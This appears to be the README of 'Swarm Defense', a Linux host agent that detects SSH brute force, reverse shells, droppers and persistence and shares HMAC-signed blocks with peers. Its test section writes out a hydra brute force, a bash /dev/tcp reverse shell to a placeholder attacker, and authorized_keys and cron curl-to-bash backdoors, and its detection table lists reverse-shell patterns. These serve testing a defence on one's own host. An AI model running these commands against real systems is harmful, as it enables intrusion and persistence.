# Swarm Defense

A defensive agent per host, talking to the other agents on the same network. No
controller, no cloud, no agent-side ML: it reads the telemetry Linux already
produces, blocks what it can prove, and tells its peers within a second so the
same attacker is refused everywhere at once.

It is built to be deployed on a machine you own and are allowed to administer.
Everything that mutates the host is behind `mode: enforce`, which refuses to
start unless the process is root.

```
                     ┌──────────── UDP 9911, HMAC-signed ────────────┐
                     │                                               │
  /var/log/auth.log ─┤                                               ├─ host B
  journald sshd/sudo │              ┌──────────────┐                 │  (agent)
  /proc/<pid>/*   ───► node A ───────│   responder  │── iptables/nft ─┘
  /proc/net/tcp     │  (agent)      │ decide → act │── kill / quarantine
  watched settings ─┤               └──────────────┘── SQLite + syslog + JSONL
       ▲            │                     ▲  threat queue
       │            └──── gossip in ───────┘
   swarm.key
```

Three layers, deliberately separated so you can audit each one:

* **Detect** (`secops/detect/`) - rule-based, each rule names the exact log text
  or `/proc` field it matched, so every decision is checkable against the trail.
* **Decide and act** (`secops/respond.py`) - one worker thread, guard rails
  before anything destructive, evidence captured first, undo record after.
* **Share** (`secops/transport.py`, `secops/signature.py`) - a compact signed
  signature: subject, attack, direction, ports, ttl, hop, reason, HMAC. Peers
  verify the format, the key, the clock and the hop limit before applying.

---

## What it watches, and what it catches

| Detection | Source | Reaction |
|---|---|---|
| `ssh_bruteforce` | failed-password / MaxAuthTries lines, per source, sliding window | block inbound, permanent after `permanent_after`, teach peers |
| `credential_breach` | an `Accepted` line from a source that had just been failing | block inbound + alert, never auto-forgotten |
| `new_source_login` | first successful login from an unknown source | alert, record the source as approved (TOFU) |
| `priv_esc_attempt` | `sudo: ... 3 incorrect password attempts`, `user NOT in sudoers` | alert, block if paired with a network hit |
| `reverse_shell` | `/dev/tcp/`, `nc -e`, `socat exec:`, `mkfifo`, interpreter socket+dup2, base64 pipe to shell | kill the process and its shell children, block the peer outbound, teach peers |
| `dropper_exec` | curl/wget pipe-to-shell, execution from `/tmp`, `/dev/shm`, `/var/tmp` | kill, quarantine the payload file, block the origin |
| `c2_outbound` | a new outbound socket to an endpoint never seen before, or reconnection to a previously bad one | block outbound, kill if corroborated by a process hit |
| `port_scan` | SYN-RECV burst across 8+ ports in one sample | block inbound |
| `persistence` | change/removal under `authorized_keys`, `sudoers`, `sshd_config`, `ld.so.preload`, cron, systemd units, `.bashrc` | line-level diff, restore the baseline, quarantine the modified copy |

The process grammar is weighted and transparent (`secops/detect/procs.py`):
individual indicators are recorded, but destructive action needs a combined
confidence above `MIN_CONFIDENCE`, lifted by corroboration - an open socket to a
never-seen endpoint, a dropper path, or a shell born under a browser. That is
what catches "employee clicks the scam link" while leaving your own
`python -c` alone.

Socket-to-process attribution is real: the agent reads `/proc/net/tcp{,6}`,
maps the socket inode back through `/proc/<pid>/fd`, and can therefore name the
binary, its cmdline, cwd, uid, SHA-256, lineage to init, and the address it was
talking to before anything is killed.

---

## Deploy

Ubuntu 22.04/24.04, Python 3.11+, stdlib only. Nothing to `pip install`.

```bash
git clone <this repo> && cd secops
sudo ./deploy/install-ubuntu.sh                       # monitor mode
sudo systemctl start swarm-agent
swarmctl status
```

The installer puts the code in `/opt/swarm`, config in `/etc/swarm/agent.json`,
state in `/var/lib/swarm` (0700), the shared key in `/etc/swarm/swarm.key`
(0600), installs `deploy/swarm-agent.service`, and adds `swarmd` / `swarmctl` to
`/usr/local/bin`. Re-running it never overwrites an existing config or key.

### Second host

Both agents must hold the **same** key and know each other's address.

```bash
# on the first host
ssh root@10.0.0.12 'install -d -m 755 /etc/swarm'
scp /etc/swarm/swarm.key root@10.0.0.12:/etc/swarm/swarm.key
ssh root@10.0.0.12 'chmod 600 /etc/swarm/swarm.key'

# on the second host, pointing back at the first
sudo ./deploy/install-ubuntu.sh --peer 10.0.0.11
```

Then add the second host to `/etc/swarm/agent.json` on the first one (and vice
versa, if you installed without `--peer`) and restart both. A `peers` entry is
`{"node": "web-02", "address": "10.0.0.12", "port": 9911}` - the `node` name is
what appears as the rule source in `swarmctl blocks`, so make them readable.
Set `swarm.node.advertise_ip` if a host has several interfaces and picks the wrong
one. Open UDP 9911 between the agents - the gossip is unicast to each configured
peer; `swarm.discovery.enabled: true` switches on multicast self-organisation
(`239.255.77.88`) so a new host needs no peer list.

If you use ufw or another ruleset alongside it, allow the gossip port before
arming the agent, or the swarm silently becomes a set of single hosts:

```bash
sudo ufw allow from 10.0.0.0/24 to any port 9911 proto udp
```

### Arm it

`monitor` (default) detects, logs, gossips and records what it *would* do -
`swarmctl blocks` shows the rules, `status` shows `dry_run: true`. Nothing
touches the kernel, no process is signalled, no file is written back.

```bash
sudo nano /etc/swarm/agent.json      # "mode": "enforce"
sudo systemctl restart swarm-agent
```

Enforce mode writes into dedicated chains it owns - `SWARM` jumped from `INPUT`
and `SWARM-OUT` jumped from `OUTPUT` (or an `inet swarm` nftables table) - and
never edits your existing rules. `swarmctl flush` removes everything it added.

---

## Test it the way you said you would

From an outside box against your deliberately vulnerable Ubuntu host. All three
scenarios below are the real code path, not a simulation.

**1. SSH brute force** - watch it block and teach:

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 16 ssh://10.0.0.11
watch -n1 swarmctl blocks           # on the target
swarmctl status | grep gossip       # on the peer: tx/rx/accepted
ssh root@10.0.0.11                  # from the attacker: now refused
swarmctl incidents                  # merged incident, hits, evidence lines
```

The default threshold is 6 failures in 120s; `ssh.permanent_after` (18) escalates
to a day. Set `ssh.failures` to 4 in a lab to see it faster.

**2. Scam link / reverse shell** - from the target, as a normal user, mimicking a
payload a browser opened (this is a test on your own machine; kill it yourself
afterwards if the agent is still in monitor mode):

```bash
nc -lvp 4444 &                      # on the attacker box
bash -c 'exec 3<>/dev/tcp/ATTACKER/4444; sh <&3 >&3 2>&3'
```

Expected on the target: a `reverse_shell` incident with the pid, cmdline, exe
SHA-256 and the peer address; in enforce mode the process is killed and its shell
children with it, the peer gets the signature, and `198.51.100.x` is refused
outbound. Evidence lands in `/var/lib/swarm/evidence/`.

**3. Persistence** - let the shell you caught edit the settings it wants to keep:

```bash
echo "ssh-rsa AAAAB3NzaC1yc2E attacker@vps" >> ~/.ssh/authorized_keys
echo 'curl -s http://ATTACKER/s | bash' > /etc/cron.d/backdoor   # as root
swarmctl integrity                  # shows the drift
swarmctl restore ~/.ssh/authorized_keys   # or let enforce mode do it
```

Expected: a `persistence` threat naming the added lines and the markers matched
(`authorized_key`, `remote_payload`, `pipe_to_shell`), the file written back from
the baseline, the modified copy quarantined rather than deleted.

**Verify the guard rails** (do this before you trust it with a production box):

```bash
swarmctl block 127.0.0.1        # refused: operator allowlist
swarmctl block <peer-address>   # refused: it would break the swarm
swarmctl status                 # guard-denied counter goes up
```

---

## Operating

Control is a Unix socket (`/var/lib/swarm/agent.sock`, mode 0600). There is no
TCP control port, so the agent adds no new network attack surface.

```
swarmctl status | peers | blocks | integrity | endpoints | stats
swarmctl incidents --limit 25 [--state open]     show <id>
swarmctl block <addr> [--ttl 3600] [--direction in|out|both] [--reason ...]
swarmctl unblock <addr> [--direction in|out]     flush
swarmctl rollback [--incident <id>]              undo the reversible actions
swarmctl isolate <addr> / release <addr>         cut a device out of the swarm
swarmctl approve-endpoint <ip:port> / revoke-endpoint <ip:port>
swarmctl approve-path <file> / restore <file>
swarmctl doctor
```

`rollback` uses the undo record stored with each action: unblocks are reversed,
restored files are re-applied, and the incident is marked `rolled_back`.

Every incident is written to `/var/lib/swarm/incidents.db` (SQLite),
`threats.jsonl`, and syslog (tag `swarm-agent`, facility `auth.warning` for
severity 3 and above), so `journalctl -t swarm-agent` works on a headless box:

```bash
sqlite3 /var/lib/swarm/incidents.db \
  "select id,attack,subject,hits,state from incidents order by id desc limit 20;"
```

---

## Layout

```
secops/
  agent.py          wiring: watchers -> queue -> responder -> gossip
  config.py         /etc/swarm/agent.json, defaults, validation
  detect/authlog.py sshd/sudo/su parsers (log text named per rule)
  detect/authbrute.py  sliding-window rules, escalation, TOFU logins
  detect/procs.py   exec-time grammar + corroboration + confidence floor
  detect/net.py     outbound endpoints, reconnection to known-bad, scan burst
  detect/integrity.py  baseline/backup/diff/restore/quarantine
  firewall.py       iptables + nftables + dry-run monitor mode
  transport.py      UDP gossip, dedupe, token bucket, hop limit
  signature.py      wire format, structural validation, HMAC
  respond.py        guard rails, kill, block, quarantine, evidence capture
  procfs.py         /proc reads: processes, sockets, inodes, lineage
  audit.py          SQLite + JSONL + syslog
  cli.py            swarmctl
  selftest.py       doctor
tests/              34 tests: units + two live agents over loopback UDP
```

```bash
python3 -m unittest discover -s tests    # units + integration
python3 -m secops doctor                 # grammar, signature, guard-rail self-test
python3 -m secops config-example         # full annotated default config
```

The integration suite runs two real agents with real UDP between them, feeding
`auth.log` lines through the same tailer and parsers a production host uses, with
the firewall in `none` mode so the test machine is never modified.

---

## What this does not do

Stated plainly, because a defence that oversells itself is worse than none.

* **It is signature and behaviour based.** Novel, heavily obfuscated, or pure
  in-memory payloads that never look like a shell can pass unremarked. The
  grammar catches the *shape* of reverse shells, not their intent.
* **UDP gossip assumes a trusted local network.** The shared key authenticates
  content and is replay-resistant within the TTL window, but it is one symmetric
  key: any host that holds it can teach the swarm, and any host that does not is
  silent. Anyone who can read the key file owns the swarm's trust. Rotate it by
  replacing the file on every host and restarting.
* **It cannot stop an attacker who is already root** through a path the agent
  does not watch, and it will not know that a legitimate-looking change is
  illegitimate. Restoring `authorized_keys` is a race you win only if the agent
  was watching before the edit.
* **It can lock you out.** Wrong allowlist, wrong confidence floor, or a NAT that
  makes one source look like many are enough. That is why monitor mode is the
  default, why the allowlist exists, why killing your own `sshd` session needs
  confidence ≥ 0.85, and why `swarmctl flush` is there.
* **Rate limiting and hop limits are crude by design** (`max_new_per_second`,
  TTL, hop count) - enough to stop a signature storm, not a proof against a
  hostile peer inside the swarm.
* **It has no evaluation data.** Detection quality depends on your traffic. Run
  it in monitor mode for a week and read the incidents before you arm it.
